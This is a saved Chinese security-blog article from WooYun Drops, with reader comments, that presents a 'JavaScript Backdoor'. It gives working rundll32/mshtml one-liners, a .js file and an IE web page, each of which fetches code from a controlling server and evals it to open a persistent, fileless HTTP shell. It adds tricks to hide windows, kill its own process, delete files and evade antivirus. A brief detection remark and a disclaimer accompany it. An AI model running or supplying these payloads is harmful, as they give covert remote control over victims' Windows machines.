@@ -1,0 +1,759 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">JavaScript Backdoor</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          三好学生</a>
+        <span class="bull">·</span>
+        <time title="2016/01/05 10:23" ui-time="" datetime="2016/01/05 10:23" class="published ng-binding ng-isolate-scope">2016/01/05 10:23</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h1>0x00 前言</h1>
+
+<hr>
+
+<p>Casey Smith最近在Twitter分享了他的研究成果，执行一段JavaScript代码即可反弹一个Http Shell，很是奇妙，所以就对这个技术做了进一步研究。</p>
+
+<p><img alt="Alt text" img-src="9040c0c0ed76f2e19c03bb049db5540697fd7062.jpg"></p>
+
+<!--more-->
+
+<h1>0x01 简介</h1>
+
+<hr>
+
+<p><img alt="Alt text" img-src="dcc5875927c5c0326f6bd732b44556c729aabec3.jpg"></p>
+
+<p>从截图我们可以看到该技术的使用方法，在cmd下利用rundll32.exe加载JavaScript代码，代码运行后会反弹一个Http Shell，而特别的地方在于当运行完cmd命令后，后台会一直存在进程rundll32.exe用来同Server持续连接，整个过程不需要写入文件，隐蔽性大大提高。</p>
+
+<h1>0x02 测试环境</h1>
+
+<hr>
+
+<p>Server：</p>
+
+<pre><code>#!bash
+OS：Win7 x64
+IP：192.168.174.131
+</code></pre>
+
+<p>Client：</p>
+
+<pre><code>#!bash
+OS：Win7 x86
+IP：192.168.174.130
+</code></pre>
+
+<p>下载链接：<br>
+<a href="https://gist.github.com/subTee/f1603fa5c15d5f8825c0">https://gist.github.com/subTee/f1603fa5c15d5f8825c0</a></p>
+
+<h1>0x03 实际测试</h1>
+
+<hr>
+
+<p><strong>1、Server启动服务，监听端口</strong></p>
+
+<p>需要将下载脚本中的IP修改为当前主机IP</p>
+
+<p>管理员运行</p>
+
+<p><strong>2、Client加载JavaScript指令</strong></p>
+
+<pre><code>#!bash
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);h.Send();B=h.ResponseText;eval(B)
+</code></pre>
+
+<p><strong>3、Server弹回Shell</strong></p>
+
+<p>可以执行cmd命令并获得回显</p>
+
+<p><img alt="Alt text" img-src="25b3d931e64c5e21c08a8fb02fd92c960ca3392c.jpg"></p>
+
+<h1>0x04 测试中的Bug</h1>
+
+<hr>
+
+<p><strong>1、连接超时</strong></p>
+
+<p><img alt="Alt text" img-src="a7a97476e79784091dd0befc2317334ec74705f1.jpg"></p>
+
+<p>在成功返回shell后，如果在后台等待一段时间，Clinet就会弹出超时连接的对话框</p>
+
+<p><img alt="Alt text" img-src="c837af4b6231a56b2de2165a330cde0cd5083ef7.jpg"></p>
+
+<p>从截图可以看到Casey Smith已经发现了连接超时的问题，所以在新版本已经做了修正，加上window.setTimeout来避免连接超时的错误，在message内加了超时判断（message存储用于实现Client后续连接的代码，具体细节一看代码就明白），但是这样做还远远不够。</p>
+
+<p><strong>2、进程残留</strong></p>
+
+<p>如果Server退出，Clinet还会存在rundll32.exe进程</p>
+
+<p><strong>3、执行cmd命令会弹黑框</strong></p>
+
+<p>如果是立即回显的cmd命令，黑框一闪而过</p>
+
+<p>如果是systeminfo这种需要等待的cmd命令，会一直弹出cmd 执行的黑框，等到执行完毕才会退出</p>
+
+<p><strong>4、执行exe会阻塞</strong></p>
+
+<p>比如执行calc.exe，server端会阻塞，直到关闭calc.exe进程才会恢复正常</p>
+
+<p>如图</p>
+
+<p><img alt="Alt text" img-src="ede84a7522286e4915c995ca89d4eba8f10ffcf4.jpg"></p>
+
+<p><strong>5、无法删除文件</strong></p>
+
+<p>如图</p>
+
+<p><img alt="Alt text" img-src="46f34d2e3ac5eb4b7ba4550b1e7929f0559a772d.jpg"></p>
+
+<p><img alt="Alt text" img-src="2fad0724100abfda7bb51a7b3f2828a64311c4ed.jpg"></p>
+
+<p><strong>6、server端无法正常退出</strong></p>
+
+<p>想退出只能强行关闭当前cmd.exe</p>
+
+<p><strong>7、无法上传下载文件</strong></p>
+
+<h1>0x05 优化思路</h1>
+
+<hr>
+
+<p><strong>1、对setTimeout的解释</strong></p>
+
+<p>查询相关资料如下：<br>
+<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/aa384061(v=vs.85).aspx</a></p>
+
+<p>文中提到了JavaScript实现WinHttpRequest的用法，如图</p>
+
+<p><img alt="Alt text" img-src="438123441c1eedfc1d0762b69dc22d7c0636a1db.jpg"></p>
+
+<p>setTimeout用来设置http的超时时间，如果全为0，代表no time-out，也就是无限期</p>
+
+<blockquote>
+  <p>注:<br>
+  在Casey Smith发布的第一个版本尚未修复该方法的时候，我解决该方法的思路是参照微软的方法，对应到代码中就是添加<br>
+  <code>h.SetTimeouts(0, 0, 0, 0);</code>即可</p>
+</blockquote>
+
+<p><strong>2、增加try catch方法处理错误消息</strong></p>
+
+<p>Casey Smith在代码中虽然加入了超时判断，但没有对其他可能产生的意外错误做判断，所以需要添加try catch对错误消息进行响应。</p>
+
+<p>try catch不仅能够解决上述问题中的Bug1，同样能用来判断输入的命令能否成功执行（比如输错命令或输错路径）</p>
+
+<p><strong>（相关细节可参照结尾提供的参考代码）</strong></p>
+
+<p>查询相关资料如下：<br>
+<a href="http://blog.csdn.net/qdfeitian/article/details/6371146">http://blog.csdn.net/qdfeitian/article/details/6371146</a></p>
+
+<p><strong>3、使用taskkill解决进程残留的问题</strong></p>
+
+<p>Clinet可以使用taskkill来结束自身进程，自动退出</p>
+
+<pre><code>#!js
+new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe"）
+</code></pre>
+
+<p><strong>4、WScript.Shell对象run和exec的区别</strong></p>
+
+<p>参考资料：</p>
+
+<ul>
+<li><a href="http://www.cnblogs.com/dongzhiquan/archive/2013/04/20/3033287.html">http://www.cnblogs.com/dongzhiquan/archive/2013/04/20/3033287.html</a></li>
+<li><a href="https://msdn.microsoft.com/zh-cn/library/ateytk4a(en-us,VS.85).aspx">https://msdn.microsoft.com/zh-cn/library/ateytk4a(en-us,VS.85).aspx</a></li>
+<li><a href="https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx">https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx</a></li>
+</ul>
+
+<p>为了获得cmd命令的回显，Casey Smith采用的方法是使用exec方法，因为只有exec方法的返回值是一个对象，才可以获得控制台输出信息和控制台错误信息</p>
+
+<p>而run方法的返回值是一个整数，就是0或1成功和失败两个状态</p>
+
+<p>但是使用exec方法也有一些弊端，比如测试中的bug3和bug4，这是exec方法本身所无法解决的问题。</p>
+
+<p>而如果使用run方法可以解决bug4</p>
+
+<p>综上，解决思路是对输入的内容做判断，如果是cmd命令，使用exec方法；如果是执行exe，使用run方法</p>
+
+<p><strong>5、解决使用run方法执行命令会弹黑框的问题</strong></p>
+
+<p>参考资料：<br>
+<a href="https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx">https://msdn.microsoft.com/zh-cn/library/d5fk67ky(en-us,VS.85).aspx</a></p>
+
+<p>如图</p>
+
+<p><img alt="Alt text" img-src="91683678abc88bb8a22deb96c076b5aa8faaf4b6.jpg"></p>
+
+<p>run方法其实后面还可以加参数指示该窗口能否被看见</p>
+
+<p>所以在执行比如taskkill的命令就可以使用</p>
+
+<pre><code>#!js
+new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true)
+</code></pre>
+
+<p>避免弹出黑框</p>
+
+<blockquote>
+  <p>注：<br>
+  <code>intWindowStyle</code>参数的说明中提到“Note that not all programs make use of this information.”<br>
+  例子之一就是用run方法来执行systeminfo这种需要等待的cmd命令是无法隐藏窗口的</p>
+</blockquote>
+
+<p><strong>6、如何隐蔽执行systeminfo并获取回显</strong></p>
+
+<p>参考了如下资料：<br>
+<a href=" <a target=" _blank"="">WooYun: 搜狗浏览器远程命令执行之五</a> "> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2015-097380">WooYun: 搜狗浏览器远程命令执行之五</a> </p>
+
+<p>如果使用exec方法，虽然可以获取到回显，但是利用window.moveTo(-1000,-1000)无法移动弹出的黑框</p>
+
+<p>而使用run方法虽然可以移动弹出的黑框，但是无法获得回显</p>
+
+<p>综合这两种方法，最后我们只能退而求其次，使用run方法将执行命令回显的结果输出到文件中，然后再通过读取文件来获取结果</p>
+
+<p>具体实现如下：</p>
+
+<p>(1)使用run方法将systeminfo回显的结果输出到文件中c\test\a.txt</p>
+
+<p>示例代码：</p>
+
+<pre><code>#!js
+new ActiveXObject("WScript.Shell").Run("cmd /c systeminfo &gt;&gt;c\test\a.txt",0,true)
+</code></pre>
+
+<p>(2)读取文件并回传</p>
+
+<p>示例代码：</p>
+
+<pre><code>#!js
+fso1=new ActiveXObject("Scripting.FileSystemObject");
+f=fso1.OpenTextFile(d,1);
+g=f.ReadAll();
+f.Close();
+</code></pre>
+
+<p>通过调用<code>new ActiveXObject("Scripting.FileSystemObject")</code>读取回显内容，然后再回传信息</p>
+
+<p><strong>（相关细节可参照结尾提供的参考代码）</strong></p>
+
+<p><strong>7、解决连接超时的问题</strong></p>
+
+<p>通过以上的分析，如果要解决连接超时的问题，需要对Clinet执行的命令添加如下功能：</p>
+
+<ol>
+<li>捕获错误消息</li>
+<li>进程自动退出</li>
+<li>全过程不弹黑框</li>
+</ol>
+
+<p>所以Clinet执行的命令最终优化为：</p>
+
+<pre><code>#!bash
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.174.131/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e{new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+</code></pre>
+
+<p><strong>8、解决server端无法正常退出</strong></p>
+
+<p>加入exit命令判断，如果输入exit，那么Client调用taskkill结束自身，Server同样执行exit退出</p>
+
+<p><strong>（相关细节可参照结尾提供的参考代码）</strong></p>
+
+<p><strong>9、解决删除文件的问题</strong></p>
+
+<p>通过调用<code>new ActiveXObject("Scripting.FileSystemObject")</code>实现</p>
+
+<p>示例代码：</p>
+
+<pre><code>#!js
+fso1=new ActiveXObject("Scripting.FileSystemObject");
+f =fso1.GetFile(d);
+f.Delete();
+</code></pre>
+
+<p><strong>（相关细节可参照结尾提供的参考代码）</strong></p>
+
+<p><strong>10、解决文件上传下载</strong></p>
+
+<p>示例如图：</p>
+
+<p><img alt="Alt text" img-src="68ff634bd2167e25433a5d587bea84205784d2c3.jpg"></p>
+
+<p>示例代码可以实现简单的文件上传下载，但里面存在一个小bug，如果你投入精力，不难解决</p>
+
+<h1>0x06 补充</h1>
+
+<hr>
+
+<h3>1、白名单进程，免疫杀毒软件</h3>
+
+<p>由于是通过rundll.exe调用的代码，所以杀毒软件会放行，不会拦截</p>
+
+<h3>2、检测</h3>
+
+<p>通信协议使用HTTP，通过防火墙拦截流量即可发现其中的攻击行为</p>
+
+<h3>3、更多加载方式</h3>
+
+<p><strong>（1）js文件</strong></p>
+
+<p>可以放在js文件里面 双击js文件执行</p>
+
+<pre><code>#!js
+h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","http://192.168.174.131/connect",false);
+try{
+h.Send();
+B=h.ResponseText;
+eval(B);
+}
+catch(e)
+{
+new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im wscript.exe",0,true);
+}
+</code></pre>
+
+<p>后台进程为wscript.exe</p>
+
+<p><strong>（2）尝试挂在网页里面</strong></p>
+
+<pre><code>#!html
+&lt;!doctype html public "-//w3c//dtd html 4.0 transitional//en"&gt;
+&lt;html&gt;
+&lt;head&gt;
+ &lt;title&gt; new document &lt;/title&gt;
+ &lt;meta name="generator" content="editplus"&gt;
+ &lt;meta name="author" content=""&gt;
+ &lt;meta name="keywords" content=""&gt;
+ &lt;meta name="description" content=""&gt;
+ &lt;script language="javascript" type="text/javascript"&gt;
+h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+h.Open("GET","http://192.168.174.131/connect",false);
+h.Send();
+B=h.ResponseText;
+eval(B);
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>使用ie打开会提示是否加载控件，如果允许，即可弹回shell</p>
+
+<p>Chrome、Firefox不支持ActiveXObject，所以不会触发</p>
+
+<h1>0x07 小结</h1>
+
+<hr>
+
+<p>我在Casey Smith的基础上，对其代码做了进一步优化，对JavaScript Backdoor技术做了进一步研究，感谢他的无私分享，才有了我的这篇文章。</p>
+
+<p>我开发的代码已上传到github，下载链接：<br>
+<a href="https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1">https://github.com/3gstudent/Javascript-Backdoor/blob/master/JSRat.ps1</a></p>
+
+<p>欢迎下载测试，交流学习。</p>
+
+<p>支持的功能如图</p>
+
+<p><img alt="Alt text" img-src="82da78f52980492e6e9bafe94b22babcce48536c.jpg"></p>
+
+<blockquote>
+  <p>注：<br>
+  本文仅用来学习交流JavaScript Backdoor技术，并提供了检测方法<br>
+  同时在文件上传下载的功能上留下了bug，距实际使用还有一点距离，以避免该方法被滥用。</p>
+</blockquote>
+
+<p><strong>本文由三好学生原创并首发于乌云drops，转载请注明</strong></p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  <div class="yarpp-related">
+<h3>为您推荐了适合您的技术文章:</h3>
+<ol id="recommandsystem">
+		<li><a href="http://drops.wooyun.org/tips/12386" rel="bookmark" id="re1">JavaScript Phishing</a></li>
+			<li><a href="http://drops.wooyun.org/tips/7713" rel="bookmark" id="re2">estools 辅助反混淆 Javascript</a></li>
+			<li><a href="http://drops.wooyun.org/tips/8260" rel="bookmark" id="re3">WMI Backdoor</a></li>
+			<li><a href="http://drops.wooyun.org/tips/150" rel="bookmark" id="re4">Browser Security-css、javascript</a></li>
+	 
+</ol>
+</div>
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">watchdoge</span>
+                 <span class="reply-time">2016-05-27 15:14:35</span>
+        </div>
+        <p></p><p>linux下可以实现么</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Cube</span>
+                 <span class="reply-time">2016-03-29 16:14:17</span>
+        </div>
+        <p></p><p>@三好学生 , Hi</p>
+<p>thanks for your quick response, i will try it. :)<br>
+I&#039;ve fav your site, it&#039;s awesome. =D</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">三好学生</span>
+                 <span class="reply-time">2016-03-29 12:14:26</span>
+        </div>
+        <p></p><p>@Cube  Hi,cube</p>
+<p>Not must be on the same host. It is just my test environment.You can run the server on any IP that your client can connect to.It is just a normal HTTP communication:)</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Cube</span>
+                 <span class="reply-time">2016-03-28 18:52:21</span>
+        </div>
+        <p></p><p>Hi,</p>
+<p>sry i dont understand the language but is it also possible to execute the script on the same host?</p>
+<p>I can only call the rundll32.exe to execute .dll files,all other is blocked by applocker. I&#039;ve used your writeup http://en.wooyun.io/2016/01/28/Bypass-Windows-AppLocker.html<br>
+With the rundll32.exe i can call an an cmd.dll of the ReactOS Team.</p>
+<p>Enviroment:<br>
+Cloud Service<br>
+Applocker active, block all other than .hta files and rundll32.exe<br>
+with rundll32.exe execute an cmd.dll<br>
+Powershell is not available</p>
+<p>So with your writeup it must be possible to set the server and client on the same host or? </p>
+<p>Please if you answer, only an advice in the right direction no complete walktrough.</p>
+<p>Thx in advance</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">houjue</span>
+                 <span class="reply-time">2016-03-03 10:31:01</span>
+        </div>
+        <p></p><p>为什么我的powershell里头 client中write和send函数都不能为空，否则就报错。显示“（”后面应该有表达式</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">三好学生</span>
+                 <span class="reply-time">2016-01-29 11:06:40</span>
+        </div>
+        <p></p><p>@杨某某 建议你重新测试一下，和环境设置没有关系，怀疑是通信接收的消息出错</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">杨某某</span>
+                 <span class="reply-time">2016-01-21 19:57:49</span>
+        </div>
+        <p></p><p>试了下，win2008里正常，win7下报错，是环境设置的问题？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">杨某某</span>
+                 <span class="reply-time">2016-01-21 17:43:24</span>
+        </div>
+        <p></p><p>一运行JsRat.ps1脚本就一直报错，这两行代码：<br>
+    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)<br>
+    $response.ContentLength64 = $buffer.length<br>
+错误信息如下：<br>
+使用“1”个参数调用“GetBytes”时发生异常:“数组不能为空。<br>
+参数名: chars”<br>
+所在位置 D:\tools\shell\JS Shell\JSRat.ps1:83 字符: 61<br>
++     [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes &lt;&lt;&lt;&lt; ($message)<br>
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException<br>
+    + FullyQualifiedErrorId : DotNetMethodException</p>
+<p>在此对象上找不到属性“ContentLength64”；请确保该属性存在且可设置。<br>
+所在位置 D:\tools\shell\JS Shell\JSRat.ps1:84 字符: 15<br>
++     $response. &lt;&lt;&lt;&lt; ContentLength64 = $buffer.length<br>
+    + CategoryInfo          : InvalidOperation: (ContentLength64:String) [], R<br>
+   untimeException<br>
+    + FullyQualifiedErrorId : PropertyNotFound</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">杨某某</span>
+                 <span class="reply-time">2016-01-21 16:00:12</span>
+        </div>
+        <p></p><p>@Touya 需要科学上网</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Travel</span>
+                 <span class="reply-time">2016-01-20 13:31:48</span>
+        </div>
+        <p></p><p>很多图片加载不出现,显示为alt text ,最后firebug查看源码是路径不对,static/drops/full/82da78f52980492e6e9bafe94b22babcce48536c.jpg,,,,drops前面多了一个路径斜杠/</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">gniq</span>
+                 <span class="reply-time">2016-01-14 21:03:35</span>
+        </div>
+        <p></p><p>IE浏览器未能成功，脚本执行有错误<br>
+网页错误详细信息<br>
+消息: Automation 服务器不能创建对象<br>
+行: 10<br>
+字符: 1<br>
+代码: 0<br>
+URI: http://XXX/XXX.html</p>
+<p>按照网上的方法注册了一些dll，依然没有成功</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">刘海哥</span>
+                 <span class="reply-time">2016-01-08 09:35:32</span>
+        </div>
+        <p></p><p>有没有大牛分享如何在渗透中利用</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">DNS</span>
+                 <span class="reply-time">2016-01-07 14:59:30</span>
+        </div>
+        <p></p><p>试验了，牛逼</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">鸟云小帅</span>
+                 <span class="reply-time">2016-01-06 15:16:10</span>
+        </div>
+        <p></p><p>@浣熊可爱 你确定改了ip么？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">鸟云小帅</span>
+                 <span class="reply-time">2016-01-06 11:51:03</span>
+        </div>
+        <p></p><p>@牛 小 帅   powershell里修改一下默认策略 set-executionpolicy remotesigned </p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">浣熊可爱</span>
+                 <span class="reply-time">2016-01-06 11:19:08</span>
+        </div>
+        <p></p><p>显示 Host Connected 但 shell一直弹不回来，如何解决呢？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">wolf</span>
+                 <span class="reply-time">2016-01-05 18:56:39</span>
+        </div>
+        <p></p><p>漏洞验证方便了很多</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">三好学生</span>
+                 <span class="reply-time">2016-01-05 16:00:29</span>
+        </div>
+        <p></p><p>@DM_ “如果使用exec方法，虽然可以获取到回显，但是利用window.moveTo(-1000,-1000)无法移动弹出的黑框<br>
+而使用run方法虽然可以移动弹出的黑框，但是无法获得回显” ，对啊，EXEC可以获取回显啊</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Touya</span>
+                 <span class="reply-time">2016-01-05 14:58:46</span>
+        </div>
+        <p></p><p>https://gist.github.com/subTee/f1603fa5c15d5f8825c0 作者Casey Smith的这个地址访问不了了，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8d6437366a0e2bcd69350468283068202b6a19126b070769361b6a17096538096b371d68083c69372668053d69302d6a1709eae4f9e5f8ef69331668292a68233b68">[email&#160;protected]</a>习吧，谢谢啦！</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">DM_</span>
+                 <span class="reply-time">2016-01-05 14:29:39</span>
+        </div>
+        <p></p><p>Dim WshShell, oExec<br>
+Set WshShell = WScript.CreateObject(&quot;WScript.Shell&quot;)<br>
+Set oExec = WshShell.Exec(&quot;ipconfig&quot;)<br>
+x = oExec.StdOut.ReadAll<br>
+Wscript.Echo x</p>
+<p>这样可以获取回显啊。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">牛 小 帅</span>
+                 <span class="reply-time">2016-01-05 13:36:45</span>
+        </div>
+        <p></p><p>无法加载文件 C:\Users\Administrator\Desktop\pu.ps1，<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="03e698a3e7bbb9e69fabe5aea7e4b0b8e4b89ce7bbaee4a582e5aea1e58aa4eba28feb8799e59faf43e48d8ae59d94e69b8d">[email&#160;protected]</a> </p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">玉林嘎</span>
+                 <span class="reply-time">2016-01-05 12:00:47</span>
+        </div>
+        <p></p><p>mark</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">SPRITEKING</span>
+                 <span class="reply-time">2016-01-05 11:53:41</span>
+        </div>
+        <p></p><p>火钳刘明</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
